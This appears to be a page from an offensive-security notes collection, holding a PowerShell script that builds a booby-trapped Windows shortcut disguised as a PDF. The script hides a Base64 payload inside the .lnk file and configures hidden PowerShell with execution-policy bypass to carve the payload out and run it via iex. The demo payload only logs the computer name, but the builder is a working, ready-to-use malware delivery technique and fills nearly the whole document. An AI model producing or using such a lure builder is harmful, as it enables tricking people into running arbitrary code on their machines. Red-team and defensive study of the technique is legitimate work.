# Scripts

```powershell
$ErrorActionPreference = "Stop" # Halt on any error

# Define the shortcut's name and output path
$shortcutFileName = "interesting-title-to-click-on.pdf.lnk"
$shortcutOutputPath = "$Home\Desktop\$shortcutFileName"
$shortcutFallbackExecutionFolder = "$env:temp"

# Define the payload script
$payloadScript = @'
    echo "This payload/script block can be substantial, potentially several megabytes.";
    echo $env:COMPUTERNAME >> $Home\Desktop\IhaveRun.txt
'@

# Encode the payload script in Base64
$payloadBytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
$encodedPayload = [Convert]::ToBase64String($payloadBytes)

# Function to convert byte array to hex string
function Convert-ByteArrayToHexString($byteArray) {
    $hexString = [System.BitConverter]::ToString($byteArray) -replace "-", ""
    return $hexString
}

# Function to convert hex string to byte array
function Convert-HexStringToByteArray($hexString) {
    $hexString = $hexString.ToLower()
    return ,@($hexString -split '([a-f0-9]{2})' | ForEach-Object { if ($_) { [System.Convert]::ToByte($_, 16) } })
}

# Function to create the shortcut with embedded payload
function CreateShortcut($payloadStartPosition, $payloadLength) {
    try {
        # Carving script to extract and execute the payload
        $carvingScript = @'
$startPosition, $payloadSize = $payloadStartPosition, $payloadLength;
$shortcutFile = '$shortcutFileName';
if (-not (Test-Path \$shortcutFile)) {
    $shortcut = Get-ChildItem -Path $shortcutFallbackExecutionFolder -Filter $shortcutFile -Recurse;
    [IO.Directory]::SetCurrentDirectory($shortcut.DirectoryName);
}
$lnkStream = New-Object IO.FileStream $shortcutFile, 'Open', 'Read', 'ReadWrite';
$encodedPayloadBytes = New-Object byte[]($payloadSize);
$lnkStream.Seek(\$startPosition, [IO.SeekOrigin]::Begin);
$lnkStream.Read($encodedPayloadBytes, 0, $payloadSize);
$decodedPayload = [Convert]::FromBase64CharArray($encodedPayloadBytes, 0, $encodedPayloadBytes.Length);
$payloadScript = [Text.Encoding]::Unicode.GetString($decodedPayload);
iex $payloadScript;
'@

        # Compress and encode the carving script
        $compressedCarvingScript = $carvingScript -replace "`n", '' -replace "`r", ''
        $carvingScriptBytes = [System.Text.Encoding]::ASCII.GetBytes($compressedCarvingScript)
        $encodedCarvingScript = [Convert]::ToBase64String($carvingScriptBytes)

        # Create the shortcut
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($shortcutOutputPath)
        $shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCarvingScript"
        $shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 1"
        $shortcut.Save()
        Write-Host "Shortcut created successfully." -ForegroundColor "Green"
    } catch {
        Write-Host "Error creating shortcut: $_" -ForegroundColor "Red"
    }
}

try {
    # Step 1: Create a dummy shortcut to determine payload start position
    Write-Host "Creating temporary shortcut for payload position calculation." -ForegroundColor "Green"
    $payloadLength = $encodedPayload.Length
    CreateShortcut 9999 $payloadLength

    # Step 2: Locate the start position of the payload in the shortcut file
    $encoding = [System.Text.Encoding]::UTF8
    $computerName = $env:COMPUTERNAME
    $computerNameBytes = $encoding.GetBytes($computerName.ToLower())
    $shortcutBytes = [System.IO.File]::ReadAllBytes($shortcutOutputPath)
    $shortcutHexContent = (Convert-ByteArrayToHexString $shortcutBytes) -join ''
    $computerNameHex = (Convert-ByteArrayToHexString $computerNameBytes) -join ''

    $payloadStartPosition = ($shortcutHexContent.IndexOf($computerNameHex)) / 2
    Write-Host "Payload start position in shortcut file: $payloadStartPosition" -ForegroundColor "Green"

    # Step 3: Remove the dummy shortcut and create the final one
    Remove-Item $shortcutOutputPath -ErrorAction Stop
    CreateShortcut $payloadStartPosition $payloadLength

    # Step 4: Embed the actual payload into the shortcut file
    $encodedPayloadBytes = $encoding.GetBytes($encodedPayload)
    $encodedPayloadHex = Convert-ByteArrayToHexString $encodedPayloadBytes
    $shortcutBytes = [System.IO.File]::ReadAllBytes($shortcutOutputPath)
    $shortcutHexContent = (Convert-ByteArrayToHexString $shortcutBytes) -join ''
    $updatedShortcutHexContent = $shortcutHexContent -replace $computerNameHex, $encodedPayloadHex
    $updatedShortcutBytes = Convert-HexStringToByteArray $updatedShortcutHexContent

    Set-Content -Value $updatedShortcutBytes -Encoding Byte -Path $shortcutOutputPath
    Write-Host "Payload successfully embedded into the shortcut file." -ForegroundColor "Green"
} catch {
    Write-Host "An error occurred: $_" -ForegroundColor "Red"
}
```

---
## References

### Uperesia

- [Uperesia: Booby Trap a Shortcut with a Backdoor](https://www.uperesia.com/booby-trapped-shortcut)